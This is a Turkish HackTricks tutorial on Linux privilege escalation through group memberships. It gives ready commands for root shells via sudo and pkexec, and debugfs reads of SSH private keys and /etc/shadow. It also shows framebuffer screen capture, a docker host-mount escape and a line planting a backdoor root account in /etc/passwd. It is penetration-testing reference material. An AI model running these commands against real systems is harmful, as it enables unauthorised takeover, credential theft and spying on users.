# İlginç Gruplar - Linux Privilege Escalation

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>

## Sudo/Yönetici Grupları

### **PE - Yöntem 1**

**Bazen**, **varsayılan olarak (veya bazı yazılımların ihtiyaç duyması nedeniyle)** **/etc/sudoers** dosyasının içinde aşağıdaki satırlardan bazılarını bulabilirsiniz:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Bu durumda, **sudo veya admin grubuna ait olan herhangi bir kullanıcı sudo olarak herhangi bir şeyi çalıştırabilir**.

Eğer durum buysa, **root olmak için sadece şunu çalıştırabilirsiniz**:
```
sudo su
```
### PE - Yöntem 2

Tüm suid ikili dosyalarını bulun ve **Pkexec** ikili dosyasının olup olmadığını kontrol edin:
```bash
find / -perm -4000 2>/dev/null
```
Eğer **pkexec** ikili dosyasının bir SUID ikili dosyası olduğunu ve **sudo** veya **admin** grubuna ait olduğunuzu tespit ederseniz, muhtemelen `pkexec` kullanarak ikili dosyaları sudo olarak çalıştırabilirsiniz.\
Bu genellikle **polkit politikası** içindeki gruplardır. Bu politika, hangi grupların `pkexec`'i kullanabileceğini belirler. Aşağıdaki komutla kontrol edebilirsiniz:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Aşağıda, hangi grupların **pkexec**'i **varsayılan olarak** çalıştırmasına izin verildiği ve bazı Linux dağıtımlarında **sudo** ve **admin** gruplarının göründüğü belirtilmektedir.

**Root olmak için şunu çalıştırabilirsiniz**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Eğer **pkexec** komutunu çalıştırmaya çalışırsanız ve aşağıdaki **hata** ile karşılaşırsanız:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**İzinlerinizin olmaması değil, GUI olmadan bağlantı kurmamanızdır**. Ve bu sorun için bir çözüm yolu burada bulunmaktadır: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2 farklı ssh oturumu**'na ihtiyacınız vardır:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="oturum2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Grubu

Bazı durumlarda, **varsayılan olarak**, **/etc/sudoers** dosyasının içinde şu satırı bulabilirsiniz:
```
%wheel	ALL=(ALL:ALL) ALL
```
Bu, **wheel grubuna ait olan herhangi bir kullanıcının sudo olarak herhangi bir şeyi çalıştırabileceği anlamına gelir**.

Eğer durum buysa, **root olmak için sadece şunu çalıştırabilirsiniz**:
```
sudo su
```
## Shadow Grubu

**shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## Disk Grubu

Bu ayrıcalık, makinenin içindeki tüm verilere erişebileceğiniz için neredeyse **root erişimiyle eşdeğerdir**.

Dosyalar: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Not: debugfs kullanarak ayrıca **dosya yazabilirsiniz**. Örneğin, `/tmp/asd1.txt` dosyasını `/tmp/asd2.txt` dosyasına kopyalamak için şunu yapabilirsiniz:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ancak, `/etc/shadow` veya `/etc/passwd` gibi **root sahibi olan dosyalara yazmaya** çalışırsanız, "**İzin reddedildi**" hatası alırsınız.

## Video Grubu

`w` komutunu kullanarak **sisteme kimin oturum açtığını** bulabilirsiniz ve aşağıdaki gibi bir çıktı gösterecektir:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**, kullanıcının makinedeki bir terminalde fiziksel olarak oturum açtığı anlamına gelir.

**video grubu**, ekran çıktısını görüntüleme yetkisine sahiptir. Temel olarak ekranları gözlemleyebilirsiniz. Bunun için, ekranın mevcut görüntüsünü ham veri olarak yakalamanız ve ekranın kullandığı çözünürlüğü elde etmeniz gerekmektedir. Ekran verileri `/dev/fb0`'a kaydedilebilir ve bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size` üzerinde bulabilirsiniz.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**Aşağıdaki adımları izleyerek**, **ham görüntüyü** açabilirsiniz. **GIMP** kullanın, \*\*`screen.raw` \*\* dosyasını seçin ve dosya türü olarak **Ham görüntü verisi**ni seçin:

![](<../../../.gitbook/assets/image (287) (1).png>)

Daha sonra, genişlik ve yüksekliği ekranda kullanılan değerlere değiştirin ve farklı Görüntü Türlerini kontrol edin (ve ekranı daha iyi gösteren birini seçin):

![](<../../../.gitbook/assets/image (288).png>)

## Root Grubu

Varsayılan olarak, **root grubunun üyeleri**, bazı **hizmet** yapılandırma dosyalarını veya bazı **kütüphane** dosyalarını veya **diğer ilginç şeyleri** değiştirmeye erişebilirler ve bu, ayrıcalıkları yükseltmek için kullanılabilir...

**Root grubunun üyelerinin hangi dosyaları değiştirebileceğini kontrol edin**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Grubu

Bir örneğin birimine ana makinenin kök dosya sistemini birim hacmine bağlayabilirsiniz, böylece örnek başladığında bu birime bir `chroot` yüklenir. Bu size etkili bir şekilde makinede kök erişimi sağlar.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Son olarak, önerilerden hiçbirini beğenmezseniz veya bir nedenle çalışmıyorlarsa (docker api firewall?), her zaman burada açıklandığı gibi bir **yetkili konteyner çalıştırabilir ve ondan kaçabilirsiniz**:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

Docker soketi üzerinde yazma izinleriniz varsa, [**bu yazıyı okuyarak docker soketini kötüye kullanarak ayrıcalıkları yükseltme**](../#writable-docker-socket)** hakkında bilgi edinebilirsiniz**.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd Grubu

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm Grubu

Genellikle **`adm`** grubunun **üyeleri**, _/var/log/_ dizininde bulunan **log** dosyalarını **okuma iznine** sahiptir.\
Bu nedenle, bu grupta bir kullanıcıyı ele geçirdiyseniz **loglara bir göz atmanızı** kesinlikle öneririm.

## Auth Grubu

OpenBSD içinde **auth** grubu, kullanılıyorsa _**/etc/skey**_ ve _**/var/db/yubikey**_ dizinlerine yazma iznine sahip olabilir.\
Bu izinler, aşağıdaki saldırıyı kullanarak ayrıcalıkları root olarak yükseltmek için kötüye kullanılabilir: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak isterseniz veya HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
